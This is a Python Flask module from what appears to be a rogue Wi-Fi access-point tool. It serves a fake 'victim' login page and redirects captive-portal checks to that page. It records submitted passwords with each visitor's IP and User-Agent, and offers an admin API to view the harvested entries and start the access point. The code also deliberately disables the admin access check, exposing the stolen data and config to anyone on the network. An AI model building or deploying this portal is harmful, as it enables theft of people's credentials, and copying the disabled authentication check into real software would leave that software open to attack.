#!/usr/bin/env python3
# wifitool/core/portal.py

import json
from pathlib import Path
from typing import Optional
import datetime

# --- MODIFIED: Added redirect and url_for ---
from flask import Flask, request, send_from_directory, abort, jsonify, redirect, url_for

from core.utils import load_config, log_event, append_entry, load_entries, ensure_dirs, save_config  # type: ignore
import core.network as network  # type: ignore

# -------------------- Flask app --------------------
app = Flask(__name__, static_folder=None)

ROOT = Path(__file__).resolve().parents[1]
WEB_DIR = ROOT / "web"
ADMIN_DIR = WEB_DIR / "admin"
# VICTIM_DIR is no longer a global constant
DATA_DIR = ROOT / "data"

# --- ADDED: Define log file path ---
LOG_FILE = ROOT / "logs" / "portal.log"

# --- ADDED: State tracking for the Access Point ---
AP_STATE = {"status": "Disabled", "port": None}

ensure_dirs()


def _get_victim_dir() -> Path:
    """Helper to get the configured victim dir path from config.json."""
    cfg = load_config()
    # Use 'victim' as default, sanitize to prevent path traversal
    site_folder = cfg.get("victim_site", "victim").strip("./\\")
    return WEB_DIR / site_folder


def _is_local_remote(remote_addr: Optional[str]) -> bool:
    """Allow only local access for admin routes"""
    # --- MODIFICATION: Security check disabled as requested ---
    # This will always return True, bypassing all "if not" checks.
    return True


# --- ADDED: Helper to read log file ---
def _read_last_log_lines(n: int = 25) -> list[str]:
    """Reads the last N lines from the portal.log file."""
    if not LOG_FILE.exists():
        return ["Log file not found."]
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            lines = f.readlines()
        return [line.strip() for line in lines[-n:]]
    except Exception as e:
        return [f"Error reading log file: {e}"]


# -------------------- Victim routes --------------------
@app.route("/", methods=["GET"])
def victim_index():
    # --- MODIFIED: Read path from config ---
    victim_dir = _get_victim_dir()
    index = victim_dir / "index.html"
    if index.exists():
        return send_from_directory(str(victim_dir), "index.html")
    return (
        "<html><body><h3>Test Portal</h3>"
        "<form method='POST' action='/submit'>"
        "<input name='device'><input name='password' type='password'>"
        "<button>Submit</button></form>"
        "</body></html>"
    )


@app.route("/<path:filename>", methods=["GET"])
def victim_top_level_static(filename: str):
    # Security: Admin files must be protected by the same IP check.
    if filename.startswith("admin/"):
        if not _is_local_remote(request.remote_addr):
            log_event(f"[portal] Admin static file access denied from {request.remote_addr}")
            abort(403)
        
        sub = filename[len("admin/"):]
        f_a = ADMIN_DIR / sub
        if f_a.exists() and f_a.is_file():
            return send_from_directory(str(ADMIN_DIR), sub)
        else:
            abort(404)

    # --- MODIFIED: Handle victim files and redirect ---
    victim_dir = _get_victim_dir() # Get path from config

    # Never serve the index file directly from its name, redirect to root
    if filename.lower() == "index.html":
         return redirect(url_for("victim_index"))

    # Victim files are public
    f_v = victim_dir / filename
    if f_v.exists() and f_v.is_file():
        # Serve static files like script.js, style.css
        return send_from_directory(str(victim_dir), filename)

    # --- FIX ---
    # If the file is not found (e.g., /generate_204, /favicon.ico, /any/other/path),
    # redirect to the main portal page. This triggers the notification.
    return redirect(url_for("victim_index"))


# -------------------- Submission handling --------------------
@app.route("/submit", methods=["POST"])
def submit():
    try:
        form = {k: v for k, v in request.form.items()}
        client_ip = request.remote_addr
        user_agent = request.headers.get("User-Agent", "")
        ts = datetime.datetime.utcnow().isoformat()

        payload = {
            "meta": {"IP ADDRESS": client_ip, "AGENT": user_agent, "ts": ts},
            "form": form
        }

        append_entry(json.dumps(payload, ensure_ascii=False))
        log_event(f"[portal] Received submission from {client_ip}; stored.")

        # --- MODIFIED: Read path from config ---
        victim_dir = _get_victim_dir()
        thanks = victim_dir / "thanks.html"
        if thanks.exists():
            return send_from_directory(str(victim_dir), "thanks.html")
        return "<html><body><h3>Thanks — submission recorded (lab).</h3></body></html>"
    except Exception as e:
        log_event(f"[portal] Error processing submission: {e}")
        return ("<html><body><h3>Server error while processing submission.</h3></body></html>", 500)


# -------------------- Admin UI and API --------------------
@app.route("/admin", methods=["GET"])
def admin_index():
    if not _is_local_remote(request.remote_addr):
        log_event(f"[portal] Admin UI access denied from {request.remote_addr}")
        abort(403)

    index = ADMIN_DIR / "admin.html"
    if index.exists():
        return send_from_directory(str(ADMIN_DIR), "admin.html")
    return "<html><body><h3>Admin UI placeholder</h3></body></html>"


@app.route("/admin/submissions", methods=["GET"])
def admin_submissions_page():
    if not _is_local_remote(request.remote_addr):
        abort(403)
    page = ADMIN_DIR / "submissions.html"
    if page.exists():
        return send_from_directory(str(ADMIN_DIR), "submissions.html")
    return "<html><body><pre>No submissions viewer found</pre></body></html>"


@app.route("/admin/api/submissions", methods=["POST"])
def admin_api_submissions():
    if not _is_local_remote(request.remote_addr):
        log_event(f"[portal] Admin API access denied from {request.remote_addr}")
        abort(403)
    try:
        records = load_entries()
        return jsonify({"count": len(records), "records": records})
    except Exception as e:
        log_event(f"[portal] admin load error: {e}")
        return jsonify({"error": "failed to load submissions", "details": str(e)}), 500


@app.route("/admin/api/adapters", methods=["GET"])
def admin_api_adapters():
    if not _is_local_remote(request.remote_addr):
        abort(403)
    try:
        adapters = network.list_wireless_interfaces()
        return jsonify({"adapters": adapters})
    except Exception as e:
        log_event(f"[portal] adapters listing error: {e}")
        return jsonify({"adapters": [], "error": str(e)}), 500


@app.route("/admin/api/sites", methods=["GET"])
def admin_api_sites():
    if not _is_local_remote(request.remote_addr):
        abort(403)
    try:
        sites = [p.name for p in WEB_DIR.iterdir() if p.is_dir() and p.name != "admin"]
        return jsonify({"sites": sites})
    except Exception as e:
        log_event(f"[portal] sites listing error: {e}")
        return jsonify({"sites": [], "error": str(e)}), 500


@app.route("/admin/api/config", methods=["GET", "POST"])
def admin_api_config():
    if not _is_local_remote(request.remote_addr):
        abort(403)
    if request.method == "GET":
        return jsonify(load_config())
    try:
        new_cfg = request.get_json(force=True)
        if not isinstance(new_cfg, dict):
            return jsonify({"error": "invalid JSON body"}), 400
        cfg = load_config()
        cfg.update(new_cfg)
        save_config(cfg)
        log_event("[portal] Admin updated config via API (no pass required).")
        return jsonify({"ok": True, "config": cfg})
    except Exception as e:
        log_event(f"[portal] Failed to update config: {e}")
        return jsonify({"error": str(e)}), 500


@app.route("/admin/api/generate", methods=["POST"])
def admin_api_generate():
    if not _is_local_remote(request.remote_addr):
        abort(403)
    try:
        network.prepare_runtime_files()
        log_event("[portal] Admin triggered runtime generation.")
        return jsonify({"ok": True, "message": "runtime files generated"})
    except Exception as e:
        log_event(f"[portal] runtime generation error: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/admin/api/start_ap", methods=["POST"])
def admin_api_start_ap():
    if not _is_local_remote(request.remote_addr):
        abort(403)
    try:
        ok = network.start_ap()
        # --- MODIFIED: Update state on success ---
        if ok:
            AP_STATE["status"] = "Running"
        return jsonify({"ok": bool(ok)})
    except Exception as e:
        log_event(f"[portal] start_ap error: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/admin/api/stop_ap", methods=["POST"])
def admin_api_stop_ap():
    if not _is_local_remote(request.remote_addr):
        abort(403)
    try:
        ok = network.stop_ap()
        # --- MODIFIED: Update state on success ---
        if ok:
            AP_STATE["status"] = "Disabled"
        return jsonify({"ok": bool(ok)})
    except Exception as e:
        log_event(f"[portal] stop_ap error: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/admin/api/logs", methods=["GET"])
def admin_api_logs():
    """API endpoint to get recent log entries."""
    if not _is_local_remote(request.remote_addr):
        abort(403)
    try:
        lines = _read_last_log_lines(n=50) # Get last 50 lines
        return jsonify({"logs": lines})
    except Exception as e:
        log_event(f"[portal] logs API error: {e}")
        return jsonify({"logs": [], "error": str(e)}), 500


# --- ADDED: New endpoint for AP status ---
@app.route("/admin/api/ap_status", methods=["GET"])
def admin_api_ap_status():
    """API endpoint to get the AP's running status."""
    if not _is_local_remote(request.remote_addr):
        abort(403)
    cfg = load_config()
    # Update port in case config changed
    AP_STATE["port"] = cfg.get("portal_port", 8080)
    return jsonify(AP_STATE)


# -------------------- Health / status --------------------
@app.route("/_status", methods=["GET"])
def status():
    cfg = load_config()
    return jsonify({"status": "ok", "portal_port": cfg.get("portal_port"), "victim_site": cfg.get("victim_site")})


# -------------------- Runner helper --------------------
def run(port: Optional[int] = None, host: str = "0.0.0.0"):
    """Run Flask portal server (used by main.py)."""
    cfg = load_config()
    p = int(port or cfg.get("portal_port", 8080))
    # --- MODIFIED: Update state on initial run ---
    AP_STATE["port"] = p
    log_event(f"[portal] Starting Flask portal on {host}:{p}")
    app.run(host=host, port=p, debug=cfg.get("debug", False))


# Expose for external imports
__all__ = ["app", "run"]


if __name__ == "__main__":
    run()